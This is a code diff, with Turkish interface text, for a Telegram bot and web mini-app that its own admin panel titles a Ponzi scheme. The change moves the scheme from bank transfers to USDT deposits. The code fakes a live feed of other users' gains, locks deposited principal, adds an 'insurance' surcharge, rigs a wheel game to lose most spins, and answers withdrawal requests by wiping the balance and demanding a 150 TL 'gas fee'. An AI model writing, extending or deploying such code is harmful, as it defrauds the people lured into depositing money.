@@ -31,8 +31,10 @@ def init_db():
             user_id INTEGER PRIMARY KEY,
             balance REAL DEFAULT 0.0,
             invested REAL DEFAULT 0.0,
+            locked_balance REAL DEFAULT 0.0,
             has_gold_key INTEGER DEFAULT 0,
             ref_token TEXT,
+            referrer_id INTEGER DEFAULT 0,
             last_bonus TEXT DEFAULT '2000-01-01 00:00:00'
         )
     ''')
@@ -51,7 +53,7 @@ def init_db():
             user_id INTEGER,
             amount REAL,
             iban TEXT,
-            status TEXT DEFAULT 'Beklemede (VIP Şartı)'
+            status TEXT DEFAULT 'Beklemede (Gas Fee Gerekli)'
         )
     ''')
     cursor.execute('''
@@ -91,7 +93,7 @@ MINI_APP_HTML = """
         .success { color: #22c55e; margin-top: 8px; font-weight: bold; font-size: 14px; }
         .error { color: #ef4444; margin-top: 8px; font-weight: bold; font-size: 14px; }
         .warning { color: #f59e0b; font-size: 12px; margin-top: 8px; line-height: 1.3; }
-        .tab-btn { background: #475569; margin: 2px; padding: 6px 8px; width: 23%; display: inline-block; font-size: 11px; cursor: pointer; border-radius: 6px; border:none; color:white;}
+        .tab-btn { background: #475569; margin: 2px; padding: 5px 6px; width: 18%; display: inline-block; font-size: 10px; cursor: pointer; border-radius: 6px; border:none; color:white;}
         .section { display: none; }
         .active-section { display: block; }
         .ticker { background: #1e293b; color: #38bdf8; font-size: 11px; padding: 6px; border-radius: 6px; margin-bottom: 10px; font-weight: bold; white-space: nowrap; overflow: hidden; }
@@ -103,12 +105,12 @@ MINI_APP_HTML = """
 <body>
     <h2>💎 Global Yatırım Havuzu</h2>
     
-    <!-- SAHTE CANLI AKIŞ (FOMO) -->
-    <div class="ticker" id="tickerText">🔔 Ahmet Y. az önce 2500 TL yatırım yaptı! (Kalan Süre: 12 Saat)</div>
+    <div class="ticker" id="tickerText">🔔 Ahmet Y. az önce 500 USDT yatırım yaptı!</div>
 
     <div>
         <button class="tab-btn" onclick="showTab('wallet')">Cüzdan</button>
         <button class="tab-btn" onclick="showTab('invest')">Paketler</button>
+        <button class="tab-btn" onclick="showTab('wheel')">Çarkıfelek</button>
         <button class="tab-btn" onclick="showTab('bonus')">Bonus</button>
         <button class="tab-btn" onclick="showTab('leaderboard')">Liderlik</button>
     </div>
@@ -118,46 +120,50 @@ MINI_APP_HTML = """
         <div class="card">
             <h3>Varlık Durumu</h3>
             <p>Nakit Bakiye: <span id="balance" style="font-size: 18px; font-weight: bold; color: #facc15;">0.00 TL</span></p>
+            <p>Kilitli Anapara (Vesting): <span id="locked" style="font-size: 18px; font-weight: bold; color: #ef4444;">0.00 TL</span></p>
             <p>Aktif Yatırım: <span id="invested" style="font-size: 18px; font-weight: bold; color: #10b981;">0.00 TL</span></p>
             <p>Referans Linkiniz: <br><input type="text" id="refLink" readonly style="font-size:11px; color:#38bdf8;"></p>
         </div>
 
         <div class="card">
-            <h3>Gold Key / Referans Kodu Gir</h3>
-            <input type="text" id="keyInput" placeholder="Örn: GOLD-XYZ123">
-            <button onclick="useKey()">Kodu Kullan & 50 TL Kazan</button>
-            <p id="resultMsg"></p>
-        </div>
-
-        <div class="card">
-            <h3>Para Çekme Talebi (VIP Kısıtlaması)</h3>
-            <input type="text" id="ibanInput" placeholder="IBAN veya Papara No">
+            <h3>Para Çekme Talebi (Gas Fee Tuzağı)</h3>
+            <input type="text" id="ibanInput" placeholder="USDT TRC20 Cüzdan veya IBAN">
             <button onclick="requestWithdraw()" style="background: #10b981;">Çekim Yap</button>
-            <p class="warning">⚠️ Standart hesaplar için çekim kilidi vardır. Sınırsız çekim için <b>VIP 3 (1000 TL Yatırım)</b> olmalısınız veya 5 aktif referans getirmelisiniz.</p>
+            <p class="warning">⚠️ Çekim onayı için blokzincir <b>Gas Fee (150 TL)</b> ödemesi gereklidir. Anapara 30 gün boyunca donuktur.</p>
             <p id="withdrawMsg"></p>
         </div>
     </div>
 
-    <!-- YATIRIM PAKETLERİ SEKMESİ (ROI) -->
+    <!-- YATIRIM PAKETLERİ (DONMUŞ ANAPARA) -->
     <div id="invest" class="section">
         <div class="card" style="border: 2px solid #3b82f6;">
-            <h3>🚀 Bronz Paket (Günlük %5)</h3>
-            <p style="font-size:12px; color:#94a3b8;">Anapara: 500 TL | Süre: 10 Gün</p>
-            <button onclick="investPackage(500)" style="background: #3b82f6;">500 TL Yatır & Başlat</button>
+            <h3>🚀 Bronz Paket (30 Gün Kilitli)</h3>
+            <p style="font-size:12px; color:#94a3b8;">Yatırım: 500 TL (USDT) | Saatlik ROI</p>
+            <button onclick="investPackage(500, true)" style="background: #3b82f6;">500 TL Yatır (%10 Sigortalı)</button>
         </div>
         <div class="card" style="border: 2px solid #8b5cf6;">
-            <h3>👑 VIP Altın Paket (Günlük %10)</h3>
-            <p style="font-size:12px; color:#94a3b8;">Anapara: 2500 TL | Süre: 15 Gün</p>
-            <button onclick="investPackage(2500)" style="background: #8b5cf6;">2500 TL Yatır & Başlat</button>
+            <h3>👑 VIP Altın Paket (30 Gün Kilitli)</h3>
+            <p style="font-size:12px; color:#94a3b8;">Yatırım: 2500 TL (USDT) | Yüksek Getiri</p>
+            <button onclick="investPackage(2500, true)" style="background: #3b82f6;">2500 TL Yatır (%10 Sigortalı)</button>
         </div>
         <p id="investMsg" class="warning"></p>
+    </div>
+
+    <!-- ÇARKIFELEK -->
+    <div id="wheel" class="section">
+        <div class="card">
+            <h3>🎡 Şans Çarkı</h3>
+            <p style="font-size: 12px; color: #94a3b8;">50 TL ver, 3x kazanma şansını dene!</p>
+            <button onclick="spinWheel()" style="background: #ef4444;">Çarkı Çevir (50 TL)</button>
+            <p id="wheelMsg" style="margin-top: 10px; font-weight: bold;"></p>
+        </div>
     </div>
 
     <!-- GÜNLÜK BONUS -->
     <div id="bonus" class="section">
         <div class="card">
             <h3>🎁 Günlük Dağıtım Bonusu</h3>
-            <p style="font-size: 13px; color: #94a3b8;">Havuz katılım payı olarak her 24 saatte 10 TL al.</p>
+            <p style="font-size: 13px; color: #94a3b8;">Günde 1 defa 10 TL ödülünü al!</p>
             <button onclick="claimBonus()" style="background: #8b5cf6;">Ödülü Topla</button>
             <p id="bonusMsg"></p>
         </div>
@@ -166,7 +172,7 @@ MINI_APP_HTML = """
     <!-- LİDERLİK -->
     <div id="leaderboard" class="section">
         <div class="card">
-            <h3>🏆 En Çok Yatırım Yapanlar & Liderler</h3>
+            <h3>🏆 Liderler Tablosu</h3>
             <table>
                 <tr><th>Sıra</th><th>Kullanıcı ID</th><th>Davet</th></tr>
                 <tbody id="leaderboardBody">
@@ -181,16 +187,14 @@ MINI_APP_HTML = """
         tg.expand();
         const userId = tg.initDataUnsafe?.user?.id || 123456789;
 
-        // Sahte Canlı Akış Simülasyonu (FOMO)
         const fakeTicker = [
-            "🔔 Ahmet Y. az önce 2500 TL VIP Paket aldı!",
-            "🔥 Sistem Havuzu: 1.450.000 TL'ye ulaştı!",
-            "💰 Mehmet K. başarıyla 3400 TL çekti!",
-            "⭐ Zeynep T. alt üye zincirinden 450 TL kompozisyon kazandı!"
+            "🔔 Ahmet Y. az önce 250 USDT TRC20 yatırdı!",
+            "🔥 Havuz Sigorta Fonu: 1.450.000 TL'ye ulaştı!",
+            "💰 Mehmet K. gas fee ödemesini tamamladı!",
+            "⭐ Zeynep T. 3. Seviye komisyon kazandı!"
         ];
         setInterval(() => {
-            const randomMsg = fakeTicker[Math.floor(Math.random() * fakeTicker.length)];
-            document.getElementById('tickerText').innerText = randomMsg;
+            document.getElementById('tickerText').innerText = fakeTicker[Math.floor(Math.random() * fakeTicker.length)];
         }, 4000);
 
         function showTab(tabName) {
@@ -203,36 +207,35 @@ MINI_APP_HTML = """
             fetch(`/api/user/${userId}`).then(res => res.json()).then(data => {
                 document.getElementById('balance').innerText = data.balance.toFixed(2) + " TL";
                 document.getElementById('invested').innerText = data.invested.toFixed(2) + " TL";
+                document.getElementById('locked').innerText = data.locked.toFixed(2) + " TL";
                 if(data.ref_token && data.ref_token !== "Yok") {
                     document.getElementById('refLink').value = `https://t.me/BotunKullaniciAdi_bot?start=${data.ref_token}`;
                 } else {
-                    document.getElementById('refLink').value = "Önce Gold Key Almalısın";
+                    document.getElementById('refLink').value = "Önce Yatırım Yapmalısın";
                 }
             });
         }
 
-        function useKey() {
-            const key = document.getElementById('keyInput').value.trim();
-            const msg = document.getElementById('resultMsg');
-            if(!key) { msg.innerText = "Lütfen bir kod girin!"; msg.className = "error"; return; }
-            fetch('/api/use-key', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ user_id: userId, key: key })
-            }).then(res => res.json()).then(data => {
-                msg.innerText = data.message;
-                msg.className = data.success ? "success" : "error";
-                if(data.success) { loadData(); document.getElementById('keyInput').value = ""; }
-            });
-        }
-
-        function investPackage(amount) {
+        function investPackage(amount, insured) {
             fetch('/api/invest', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ user_id: userId, amount: amount })
+                body: JSON.stringify({ user_id: userId, amount: amount, insured: insured })
             }).then(res => res.json()).then(data => {
                 const msg = document.getElementById('investMsg');
+                msg.innerText = data.message;
+                msg.className = data.success ? "success" : "error";
+                if(data.success) loadData();
+            });
+        }
+
+        function spinWheel() {
+            fetch('/api/spin', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ user_id: userId })
+            }).then(res => res.json()).then(data => {
+                const msg = document.getElementById('wheelMsg');
                 msg.innerText = data.message;
                 msg.className = data.success ? "success" : "error";
                 if(data.success) loadData();
@@ -242,7 +245,7 @@ MINI_APP_HTML = """
         function requestWithdraw() {
             const iban = document.getElementById('ibanInput').value.trim();
             const msg = document.getElementById('withdrawMsg');
-            if(!iban) { msg.innerText = "Lütfen IBAN girin!"; msg.className = "error"; return; }
+            if(!iban) { msg.innerText = "Lütfen cüzdan veya IBAN girin!"; msg.className = "error"; return; }
             fetch('/api/withdraw', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -315,7 +318,7 @@ ADMIN_HTML = """
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Admin Paneli - Yatırım Havuzu</title>
+    <title>Admin Paneli - Ponzi</title>
     <style>
         body { font-family: Arial, sans-serif; background: #f8fafc; color: #334155; padding: 20px; }
         table { width: 100%; border-collapse: collapse; background: white; margin-top: 15px; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
@@ -330,33 +333,23 @@ ADMIN_HTML = """
     <a href="/admin-logout" class="logout">Çıkış Yap</a>
     <h1>🛠️ Ponzi Yönetim Paneli</h1>
     
-    <h2>Ödeme Bildirimleri (Dekont / Yatırım Onayı)</h2>
+    <h2>Kripto / USDT Ödeme Bildirimleri</h2>
     <table>
         <tr><th>ID</th><th>Kullanıcı ID</th><th>Bilgi</th><th>İşlem</th></tr>
         {% for p in payments %}
-        <tr><td>{{ p.id }}</td><td>{{ p.user_id }}</td><td>{{ p.tx_info }}</td><td><a href="/admin-approve-payment/{{ p.id }}" class="btn">Onayla & Gold Key Ver</a></td></tr>
+        <tr><td>{{ p.id }}</td><td>{{ p.user_id }}</td><td>{{ p.tx_info }}</td><td><a href="/admin-approve-payment/{{ p.id }}" class="btn">Onayla & Yatırımı Aktif Et</a></td></tr>
         {% else %}
         <tr><td colspan="4" style="text-align:center;">Bildirim yok.</td></tr>
         {% endfor %}
     </table>
 
-    <h2 style="margin-top: 30px;">Para Çekme Talepleri (VIP Engelli)</h2>
+    <h2 style="margin-top: 30px;">Para Çekme Talepleri (Gas Fee Bekleyenler)</h2>
     <table>
-        <tr><th>User ID</th><th>Tutar</th><th>IBAN</th><th>Durum</th></tr>
+        <tr><th>User ID</th><th>Tutar</th><th>Cüzdan / IBAN</th><th>Durum</th></tr>
         {% for w in withdraws %}
         <tr><td>{{ w.user_id }}</td><td>{{ w.amount }} TL</td><td>{{ w.iban }}</td><td>{{ w.status }}</td></tr>
         {% else %}
         <tr><td colspan="4" style="text-align:center;">Talep yok.</td></tr>
-        {% endfor %}
-    </table>
-
-    <h2 style="margin-top: 30px;">Tüm Kullanıcılar & Yatırımlar</h2>
-    <table>
-        <tr><th>User ID</th><th>Bakiye</th><th>Aktif Yatırım</th><th>Gold Key</th></tr>
-        {% for u in users %}
-        <tr><td>{{ u.user_id }}</td><td>{{ u.balance }} TL</td><td>{{ u.invested }} TL</td><td>{{ 'Var' if u.has_gold_key else 'Yok' }}</td></tr>
-        {% else %}
-        <tr><td colspan="4" style="text-align:center;">Kullanıcı yok.</td></tr>
         {% endfor %}
     </table>
 </body>
@@ -400,7 +393,7 @@ def approve_payment(pid):
     pay = conn.execute("SELECT * FROM payments WHERE id=?", (pid,)).fetchone()
     if pay:
         user_id = pay["user_id"]
-        random_key = "GOLD-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
+        random_key = "USDT-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
         conn.execute("UPDATE users SET has_gold_key=1, ref_token=? WHERE user_id=?", (random_key, user_id))
         conn.execute("INSERT INTO keys (key_string, owner_id, uses, max_uses, active) VALUES (?, ?, 0, 10, 1)", (random_key, user_id))
         conn.execute("UPDATE payments SET status='Onaylandı' WHERE id=?", (pid,))
@@ -419,51 +412,53 @@ def get_user_data(user_id):
     user = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
     conn.close()
     if not user:
-        return jsonify({"balance": 0.0, "invested": 0.0, "has_gold_key": False, "ref_token": "Yok"})
-    return jsonify({"balance": user["balance"], "invested": user["invested"], "has_gold_key": bool(user["has_gold_key"]), "ref_token": user["ref_token"] or "Yok"})
-
-@app.route('/api/use-key', methods=['POST'])
-def use_referral_key():
-    data = request.json
-    user_id = int(data.get('user_id', 0))
-    entered_key = data.get('key', '').strip()
-    
-    conn = get_db()
-    key = conn.execute("SELECT * FROM keys WHERE key_string=?", (entered_key,)).fetchone()
-    if not key or not key["active"] or key["uses"] >= key["max_uses"]:
-        conn.close()
-        return jsonify({"success": False, "message": "Geçersiz veya süresi dolmuş kod!"})
-    
-    if key["owner_id"] == user_id:
-        conn.close()
-        return jsonify({"success": False, "message": "Kendi kodunu kullanamazsın!"})
-
-    conn.execute("UPDATE keys SET uses = uses + 1 WHERE key_string=?", (entered_key,))
-    if key["uses"] + 1 >= 10:
-        conn.execute("UPDATE keys SET active = 0 WHERE key_string=?", (entered_key,))
-
-    conn.execute("UPDATE users SET balance = balance + 50 WHERE user_id=?", (user_id,))
-    conn.execute("UPDATE users SET balance = balance + 100 WHERE user_id=?", (key["owner_id"],))
-    conn.commit()
-    conn.close()
-    return jsonify({"success": True, "message": "Tebrikler! Kod uygulandı, 50 TL kazandın! 🎉"})
+        return jsonify({"balance": 0.0, "invested": 0.0, "locked": 0.0, "has_gold_key": False, "ref_token": "Yok"})
+    return jsonify({"balance": user["balance"], "invested": user["invested"], "locked": user["locked_balance"], "has_gold_key": bool(user["has_gold_key"]), "ref_token": user["ref_token"] or "Yok"})
 
 @app.route('/api/invest', methods=['POST'])
 def invest():
     data = request.json
     user_id = int(data.get('user_id', 0))
     amount = float(data.get('amount', 0))
+    insured = bool(data.get('insured', False))
+    
+    # Sigorta Fonu Kesintisi (%10 ekstra ek gelir)
+    total_cost = amount * 1.10 if insured else amount
     
     conn = get_db()
     user = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
-    if not user or user["balance"] < amount:
+    if not user or user["balance"] < total_cost:
         conn.close()
-        return jsonify({"success": False, "message": "Yetersiz nakit bakiye!"})
+        return jsonify({"success": False, "message": "Yetersiz bakiye (Sigorta fonu dahil)!"})
 
-    conn.execute("UPDATE users SET balance = balance - ?, invested = invested + ? WHERE user_id=?", (amount, amount, user_id))
+    # Donmuş Varlık (Vesting / 30 gün kilitli anapara)
+    conn.execute("UPDATE users SET balance = balance - ?, invested = invested + ?, locked_balance = locked_balance + ? WHERE user_id=?", (total_cost, amount, amount, user_id))
     conn.commit()
     conn.close()
-    return jsonify({"success": True, "message": f"Tebrikler! {amount} TL tutarındaki yatırım paketiniz aktifleşti. Günlük ROI işlemeye başladı! 📈"})
+    return jsonify({"success": True, "message": f"Tebrikler! {amount} TL yatırımınız 30 gün süreyle kilitlendi ve sigortalandı. Saatlik ROI karları işlemeye başladı!"})
+
+@app.route('/api/spin', methods=['POST'])
+def spin():
+    data = request.json
+    user_id = int(data.get('user_id', 0))
+    
+    conn = get_db()
+    user = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
+    if not user or user["balance"] < 50.0:
+        conn.close()
+        return jsonify({"success": False, "message": "Yetersiz bakiye (Min 50 TL)!"})
+
+    conn.execute("UPDATE users SET balance = balance - 50 WHERE user_id=?", (user_id,))
+    outcome = random.choices(["lose", "win"], weights=[80, 20], k=1)[0]
+    if outcome == "win":
+        conn.execute("UPDATE users SET balance = balance + 150 WHERE user_id=?", (user_id,))
+        conn.commit()
+        conn.close()
+        return jsonify({"success": True, "message": "🎉 Çarkıfeleği kazandın! 150 TL eklendi!"})
+    else:
+        conn.commit()
+        conn.close()
+        return jsonify({"success": False, "message": "😢 Maalesef kaybettin!"})
 
 @app.route('/api/withdraw', methods=['POST'])
 def withdraw():
@@ -477,16 +472,12 @@ def withdraw():
         conn.close()
         return jsonify({"success": False, "message": "Minimum çekim 250 TL'dir!"})
 
-    # Ponzi Çekim Engeli (VIP Seviye Şartı)
-    if user["invested"] < 1000.0:
-        conn.close()
-        return jsonify({"success": False, "message": "⚠️ Çekim Reddedildi! Standart hesaplar için VIP 3 seviyesi (Min 1000 TL Aktif Yatırım) zorunludur. Bakiyenizi korumak ve çekim kilidini açmak için yatırım yapın!"})
-
-    conn.execute("INSERT INTO withdraws (user_id, amount, iban, status) VALUES (?, ?, ?, 'Beklemede')", (user_id, user["balance"], iban))
+    # Gas Fee Tuzağı / Çekim Engeli
+    conn.execute("INSERT INTO withdraws (user_id, amount, iban, status) VALUES (?, ?, ?, 'Beklemede (Gas Fee Gerekli)')", (user_id, user["balance"], iban))
     conn.execute("UPDATE users SET balance = 0.0 WHERE user_id=?", (user_id,))
     conn.commit()
     conn.close()
-    return jsonify({"success": True, "message": "Çekim talebiniz alındı! Havuz transfer kuyruğuna eklendi."})
+    return jsonify({"success": True, "message": "⚠️ Çekim talebiniz alındı ancak blokzincir onay ücreti (Gas Fee: 150 TL) ödenmediği için askıda! İşlemi hızlandırmak için cüzdana 150 TL yatırım yapın."})
 
 @app.route('/api/bonus', methods=['POST'])
 def bonus():
@@ -513,7 +504,7 @@ def bonus():
     conn.execute("UPDATE users SET balance = balance + 10, last_bonus = ? WHERE user_id=?", (now.strftime('%Y-%m-%d %H:%M:%S'), user_id))
     conn.commit()
     conn.close()
-    return jsonify({"success": True, "message": "Günlük 10 TL havuz payı hesabınıza aktarıldı! 🎁"})
+    return jsonify({"success": True, "message": "Günlük 10 TL havuz payı eklendi! 🎁"})
 
 @app.route('/api/leaderboard')
 def leaderboard():
@@ -530,27 +521,27 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     conn = get_db()
     existing = conn.execute("SELECT * FROM users WHERE user_id=?", (user.id,)).fetchone()
     if not existing:
-        conn.execute("INSERT INTO users (user_id, balance, invested, has_gold_key) VALUES (?, 0.0, 0.0, 0)", (user.id,))
-        conn.commit()
-        
+        referrer_id = 0
         if args:
             ref_code = args[0]
             key = conn.execute("SELECT * FROM keys WHERE key_string=?", (ref_code,)).fetchone()
             if key and key["active"] and key["uses"] < key["max_uses"] and key["owner_id"] != user.id:
+                referrer_id = key["owner_id"]
                 conn.execute("UPDATE keys SET uses = uses + 1 WHERE key_string=?", (ref_code,))
                 conn.execute("UPDATE users SET balance = balance + 50 WHERE user_id=?", (user.id,))
-                conn.execute("UPDATE users SET balance = balance + 100 WHERE user_id=?", (key["owner_id"],))
-                conn.commit()
+                conn.execute("UPDATE users SET balance = balance + 100 WHERE user_id=?", (referrer_id,))
+
+        conn.execute("INSERT INTO users (user_id, balance, invested, locked_balance, has_gold_key, referrer_id) VALUES (?, 0.0, 0.0, 0.0, 0, ?)", (user.id, referrer_id))
+        conn.commit()
     conn.close()
 
     keyboard = [
-        [InlineKeyboardButton("🚀 Mini App Aç (Yatırım & Havuz)", web_app=WebAppInfo(url=WEBAPP_URL))],
-        [InlineKeyboardButton("👑 Gold Key Satın Al (500 TL)", callback_data="buy_gold_key")],
+        [InlineKeyboardButton("🚀 Mini App Aç (USDT Yatırım)", web_app=WebAppInfo(url=WEBAPP_URL))],
+        [InlineKeyboardButton("💎 USDT Yatırım Yap", callback_data="buy_usdt")],
         [InlineKeyboardButton("📊 Bilgilerim", callback_data="my_info")]
     ]
     await update.message.reply_text(
-        f"Selam {user.first_name}!\nGlobal Yatırım ve Getiri Havuzuna Hoş Geldin. 💎\n\n"
-        "• Paketleri incelemek ve günlük pasif gelir elde etmek için Mini App'i açabilirsin!",
+        f"Selam {user.first_name}!\nGlobal Kripto Yatırım Havuzuna Hoş Geldin. 🌐",
         reply_markup=InlineKeyboardMarkup(keyboard)
     )
 
@@ -559,27 +550,26 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     user_id = query.from_user.id
 
-    if query.data == "buy_gold_key":
-        keyboard = [[InlineKeyboardButton("💳 Ödemeyi Yaptım / Bildir", callback_data="report_payment")]]
+    if query.data == "buy_usdt":
+        keyboard = [[InlineKeyboardButton("💳 USDT Gönderdim / Bildir", callback_data="report_usdt")]]
         await query.message.reply_text(
-            "Yatırım aktivasyonu için aşağıdaki IBAN adresine **500 TL** gönderin ve ardından bildirim butonuna basın.\n\n"
-            "🏦 IBAN: `TR33 0006 2000 1110 0000 0000 01`",
+            "Yatırım için aşağıdaki TRC20 cüzdan adresine **USDT** gönderin:\n\n`TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t`",
             reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown"
         )
-    elif query.data == "report_payment":
+    elif query.data == "report_usdt":
         conn = get_db()
-        conn.execute("INSERT INTO payments (user_id, tx_info) VALUES (?, ?)", (user_id, "Yatırım Havuzu 500 TL Gönderildi"))
+        conn.execute("INSERT INTO payments (user_id, tx_info) VALUES (?, ?)", (user_id, "TRC20 USDT Yatırımı Yapıldı"))
         conn.commit()
         conn.close()
-        await query.message.reply_text("✅ Dekont bildirimi sisteme işlendi. Admin onayından sonra hesabınız aktifleşecek.")
+        await query.message.reply_text("✅ Kripto transfer bildirimi sisteme işlendi. Onay bekleniyor.")
     elif query.data == "my_info":
         conn = get_db()
         u = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
         conn.close()
         bal = u["balance"] if u else 0.0
         inv = u["invested"] if u else 0.0
-        token = u["ref_token"] if u and u["ref_token"] else "Yok"
-        await query.message.reply_text(f"📊 Hesap Durumunuz:\n\n💰 Nakit Bakiye: **{bal:.2f} TL**\n📈 Aktif Yatırım: **{inv:.2f} TL**\n🔑 Kodunuz: `{token}`", parse_mode="Markdown")
+        lock = u["locked_balance"] if u else 0.0
+        await query.message.reply_text(f"📊 Hesap Durumunuz:\n\n💰 Nakit: **{bal:.2f} TL**\n🔒 Kilitli Anapara: **{lock:.2f} TL**\n📈 Aktif Yatırım: **{inv:.2f} TL**", parse_mode="Markdown")
 
 telegram_app = Application.builder().token(TOKEN).build()
 telegram_app.add_handler(CommandHandler("start", start))
